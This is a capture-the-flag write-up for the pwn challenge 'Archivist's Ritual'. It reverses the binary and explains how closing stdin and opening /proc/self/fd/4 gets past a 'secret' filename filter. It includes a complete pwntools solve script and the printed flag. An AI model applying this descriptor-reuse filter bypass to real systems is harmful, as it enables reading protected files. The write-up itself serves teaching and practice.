# Archivist's Ritual — Pwn Writeup
## Author : afk-Yato (facelesspwner)

## Overview

| | |
|---|---|
| **Challenge** | Archivist's Ritual (author: afk-Yato) |
| **Category** | Pwn / File Descriptor manipulation |
| **Binary** | `archivist` — ELF 64-bit, PIE, not stripped |
| **Flag** | `NSC{when_the_first_gate_falls_the_hidden_script_emerges}` |

```
$ checksec archivist
    PIE      : YES
    RELRO    : PARTIAL
    NX       : ENABLED
    Canary   : NO
```

> *The Archivist guards ancient knowledge through a strange interface of rituals and channels.
> Scrolls may be summoned, channels may be sealed, and the oracle may whisper truths… or lies.
> But one scroll remains forbidden — the Secret Ancient Scroll.*

## The Program

Reversing `main` (`0x12d2`):

```c
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    control_fd = dup(0);                          // fd 3 — backup of stdin!
    int fd = open("secret_scroll.txt", O_RDONLY); // fd 4 — THE FLAG, opened at startup
    if (fd < 0) exit(1);

    while (1) {
        menu();                       // 1..4
        switch (read_int()) {

        case 1:  // Invoke prophecy
            printf("The oracle whispers: ");
            read(0, buf, 0x100);      // reads from fd 0 (stdin)
            printf("Vision: %s\n", buf);
            break;

        case 2: {  // Seal channel
            printf("Channel rune: ");
            int rune = read_int();
            close((rune ^ 0x1337) & 3);   // closes fd 0..3, chosen by the rune!
            puts("The channel is sealed.");
        } break;

        case 3: {  // Summon scroll
            printf("Scroll name: ");
            read_str(name, 0x100);    // NOTE: reads from control_fd (fd 3)
            if (strstr(name, "secret"))
                { puts("That scroll is forbidden..."); exit(0); }
            int f = open(name, O_RDONLY);
            printf("The scroll appears on channel %d\n", f);
        } break;

        case 4: exit(0);
        }
    }
}
```

`read_str` (`0x1228`) memsets the buffer and then reads from **`control_fd`** (the `dup(0)` saved at startup) — an important detail, see below.

Two interesting observations:

* The flag file is **already open** as fd 4 from the very start, and nothing ever reads it through that fd — but `open("/proc/self/fd/4")` re-opens the same file and gives you a fresh fd.
* "Summon scroll" refuses any path containing `"secret"` — so `secret_scroll.txt` can't be summoned by name.

## The Bugs

### 1. The "seal channel" rune is an fd-closing oracle

```c
close((rune ^ 0x1337) & 3);
```

`& 3` means only fds **0–3** can ever be closed, but which one is fully controlled:

| rune | `rune ^ 0x1337` | `& 3` | closes |
|------|-----------------|-------|--------|
| 0    | 0x1337          | 3     | control_fd |
| 1    | 0x1336          | 2     | stderr |
| 2    | 0x1335          | 1     | stdout |
| **3**| 0x1334          | **0** | **stdin (fd 0)** |

Closing **fd 0** doesn't kill the program — all further *input* still works because:
* menu/`read_int` and `read_str` read through the shell's remaining fds (the menu reader and `read_str` use `control_fd` = fd 3, the `dup(0)` made at startup).

But `read(0, ...)` in **"Invoke prophecy"** now refers to whatever file occupies fd 0 — and Linux assigns the **lowest free fd** to the next `open()`.

### 2. The "secret" filter is a plain `strstr` on the raw input

`strstr(name, "secret")` — it only sees the string we typed. It does not canonicalize the path.

## Exploit Strategy

1. **Seal channel with rune `3`** → `close(0)` → fd 0 becomes free.
2. **Summon scroll `/proc/self/fd/4`** →
   * contains no `"secret"` substring → passes the filter,
   * `/proc/self/fd/4` is a magic symlink to the already-open `secret_scroll.txt`,
   * `open()` returns the **lowest free fd = 0**, so the flag file is now stdin!
   * The program even tells you: `The scroll appears on channel 0`.
3. **Invoke prophecy** → `read(0, buf, 0x100)` reads **the flag file** into `buf`, and `printf("Vision: %s\n", buf)` prints it.

The oracle's "Vision" is the flag itself.

## Final Exploit

```python
from pwn import *

p = process('./archivist')          # remote(...) on the real instance

p.sendlineafter('> ', '2')          # Seal channel
p.sendlineafter('Channel rune: ', '3')   # (3 ^ 0x1337) & 3 == 0 -> close(fd 0)

p.sendlineafter('> ', '3')          # Summon scroll
p.sendafter('Scroll name: ', b'/proc/self/fd/4\x00')   # bypasses "secret" filter
                                     # open() lands on freed fd 0

p.sendlineafter('> ', '1')          # Invoke prophecy -> read(0,...) = read flag
print(p.recvline_contains(b'Vision:'))
```

```
$ python3 solve.py
The oracle whispers: Vision: NSC{when_the_first_gate_falls_the_hidden_script_emerges}
```

(The scroll-name `send` must be a raw `send` with an explicit NUL — `read_str` reads a fixed size from `control_fd`, so a `sendline` newline would end up in the path.)

## Notes / Takeaways

* This is a **pure logic challenge** — no memory corruption at all. The three ingredients:
  1. an fd you can close (`close((rune ^ 0x1337) & 3)`),
  2. a filter that only inspects the literal input string (`strstr`),
  3. an input routine that reads from a fixed fd (`read(0, ...)`).
* `/proc/self/fd/N` is the universal answer to "I can open files but the name is filtered" — it re-opens an existing fd by number, with a completely different-looking path.
* The flag content itself hints at the intended solve: *"when the first gate falls (fd 0 closed), the hidden script emerges (the secret scroll re-opened on fd 0)"*.
* The `dup(0)` at startup (→ fd 3) is what keeps the program interactive after stdin is closed — without it, the "seal channel" option would be a self-destruct button and the challenge would be unsolvable.
